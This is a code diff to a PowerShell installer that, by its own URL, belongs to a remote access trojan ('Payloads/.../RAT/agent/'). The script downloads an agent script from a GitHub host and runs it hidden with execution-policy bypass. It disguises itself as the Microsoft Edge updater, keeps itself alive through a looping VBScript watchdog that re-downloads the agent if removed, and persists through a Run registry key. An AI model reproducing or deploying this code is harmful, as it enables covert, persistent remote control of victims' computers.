@@ -4,7 +4,7 @@ $installDir = Join-Path $env:APPDATA "MicrosoftEdgeUpdate"
 $vbsDir = Join-Path $env:APPDATA "Microsoft"
 New-Item -ItemType Directory -Force -Path $installDir
 
-$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/"
+$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/agent/"
 Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $installDir "agent.ps1")
 
 $agentPath = Join-Path $installDir "agent.ps1"
@@ -20,8 +20,10 @@ Do While True
     fileExists = objFSO.FileExists("$agentPath")
 
     If Not fileExists Then
-        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""iex (irm '${baseUrl}install.ps1')""", 0, False
-        WScript.Quit
+        If Not objFSO.FolderExists("$scriptDir") Then
+            objFSO.CreateFolder "$scriptDir"
+        End If
+        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri '${baseUrl}agent.ps1' -OutFile '$scriptDir\agent.ps1'""", 0, False
     End If
     
     Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
@@ -53,7 +55,10 @@ $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
     Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
 }
-Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -Value "wscript.exe `"$vbsPath`""
+if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdates" -ErrorAction SilentlyContinue) {
+    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdates"
+}
+Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdates" -Value "wscript.exe `"$vbsPath`""
 
 Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
 exit
